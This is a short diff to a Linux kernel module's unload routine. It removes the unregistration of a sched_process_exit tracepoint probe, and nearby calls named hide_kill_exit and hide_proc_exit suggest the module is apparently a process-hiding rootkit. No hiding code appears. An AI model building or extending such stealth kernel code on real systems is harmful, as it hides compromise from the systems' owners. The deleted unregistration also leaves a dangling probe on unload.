@@ -258,9 +258,7 @@ void __exit driver_unload(void)
 		}
 	}
     
-    // --- Unregister Tracepoint ---
-    tracepoint_probe_unregister(&__tracepoint_sched_process_exit, (void *)process_exit_probe, NULL);
-    printk(KERN_INFO "[+] sched_process_exit tracepoint unregistered.\n");
+    
 
 	hide_kill_exit();
 	hide_proc_exit();
